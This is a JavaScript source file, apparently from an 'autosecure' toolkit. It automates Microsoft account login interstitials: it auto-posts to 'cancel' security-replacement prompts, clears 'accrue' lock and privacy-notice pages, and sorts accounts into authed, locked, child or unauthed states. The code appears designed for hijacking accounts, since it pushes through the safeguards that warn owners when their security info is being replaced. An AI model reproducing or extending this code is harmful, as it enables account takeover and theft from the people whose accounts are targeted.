const decode = require("../../../autosecure/utils/secure/decode")


module.exports = async function loginHelper(axios, d = false, repeat = 0, userid) {
    console.log(`Helping with login!`)
    let loginData;
    
    try {
        loginData = await axios.post("https://login.live.com/login.srf");
    } catch (error) {
        console.log(`[LOGINHELPER] Error making login request:`, error.message);
        if (error.response && error.response.status === 400) {
            console.log(`[LOGINHELPER] HTTP 400 - Invalid authentication data`);
            return "unauthed";
        }
        if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT') {
            console.log(`[LOGINHELPER] Network timeout during login`);
            return "unauthed";
        }
        throw error;
    }
    let link = loginData?.data?.match(/action="([^"]+)"/)?.[1]
if (link) {
    if (link.includes("child-consent") || link.includes("child-landing")){
        console.log(`Got child landing: ${link}`)
        return "child"
    }
    console.log(`Link: ${link}`);
    if (link.includes('/confirm')) {
        console.log(`Got the confirm issue: ${link}`);
    }


        /*
        Locked
        */
        if (link.includes("accrue")) {
            console.log("ACCRUE!!")
            if (repeat > 2) { return "unauthed" }
            let ipt = loginData.data.match(/<input[^>]+name=["']ipt["'][^>]+value=["']([^"']+)["']/)?.[1]

            const accrueData = await axios.post(link, `ipt=${ipt}`)

            let canary = accrueData.data.match(/<input[^>]+name=["']canary["'][^>]+value=["']([^"']+)["']/)?.[1] || decode(accrueData?.data?.match(/"sCanary":"([^"]*)"/)?.[1])

            if (canary) {
                await axios.post(link, `canary=${encodeURIComponent(canary)}`)
            } else {
                console.log(`No Canary`, ``)
                await axios.post(link)
            }
            return await loginHelper(axios, ++repeat)
        }


        /*
        Cancel Replacing Security
        */
        else if (link.includes("cancel")) {
            if (d){
                // getssid fix
                return "cancel"
            }
            console.log(`CANCEL!!`)
            let ipt = loginData.data.match(/<input[^>]+name=["']ipt["'][^>]+value=["']([^"']+)["']/)?.[1]

            await axios.post(link, `ipt=${ipt}`)
            return await loginHelper(axios, ++repeat)
        }


        /*
        Privacy Notice
        */
        else if (link.includes("privacynotice")) {
            if (repeat > 2) { return "unauthed" }
            console.log(`Got Privacy notice account!`)
            const correlationIdMatch = loginData.data.match(/name="correlation_id"[^>]+value="([^"]+)"/);
            const codeMatch = loginData.data.match(/name="code"[^>]+value="([^"]+)"/);
            const correlationId = correlationIdMatch?.[1] || null;
            const code = codeMatch?.[1] || null;

            if (code && correlationId) {
                const noticeData = await axios.post(link, `correlation_id=${correlationId}&code=${code}`)
                const regex = /ucis\.(\w+) = '([^']*)';/g;

                const uciData = {};
                let match;
                const encryptedPayload = noticeData.data?.match(/ucis\.SerializedEncryptionData\s*=\s*('|"|)(.*?)(\1)/)?.[2]

                while ((match = regex.exec(noticeData.data)) !== null) {
                    const key = match[1];
                    const value = match[2];
                    uciData[key] = value;
                }
                const formData = `-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="ClientId"

            ${uciData?.ClientId}
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="ConsentSurface"

SISU
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="ConsentType"

ucsisunotice
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="correlation_id"

            ${uciData?.CorrelationId}
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="CountryRegion"

US
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="DeviceId"

-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="SerializedEncryptionData"

            ${encryptedPayload}
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="FormFactor"

Desktop
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="Market"

EN-US
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="ModelType"

ucsisunotice
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="ModelVersion"

1.14
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="NoticeId"

            ${uciData?.NoticeId}
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="Platform"

Web
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="UserId"

            ${uciData?.UserId}
-----------------------------21228718521184446577444291967
Content-Disposition: form-data; name="UserVersion"

1
-----------------------------21228718521184446577444291967--`;
                await axios.post(`https://privacynotice.account.microsoft.com/recordnotice`,
                    formData, {
                    headers: {
                        "Content-Type": "multipart/form-data; boundary=---------------------------21228718521184446577444291967",

                    }
                })
            }
            return await loginHelper(axios, ++repeat)


        /*
        Phone Locked
        */

                /// TD








        /*
        Locked
        */
        } else if (link.includes("identity/confirm")) {
            return "locked"
        }


        else if (link.includes("Abuse")) {
            console.log(`ABUSE!!`)
            return "locked"
        }

        else if (link.includes("RecoverAccount")) {
            console.log(`User has to enable their account again!`)
            return "unauthed"
        }

        else if (link.includes("recover")) {
            console.log(`Locked!`)
            return "unauthed"
        }

        else if (link.includes("/proofs")) {
            console.log(`Authenticated Account!`)
            return "authed"
        }

        else {
            console.log(`Couldn't match this link ${link}`)
            return "authed"
        }

        /*
        No Link
        */

    } else {
        console.log(`No link!`)
        if (loginData?.headers?.Location?.includes("account.live.com")) {
            return "authed"
        } else if (loginData.data.includes("kmsi_en")) {
            return "authed"
        } else if (loginData.data.includes("login_en")) {
            return "unauthed"
        } else if (loginData.data == "") {
            return "authed"
        } else {
            return "authed"
        }
    }
}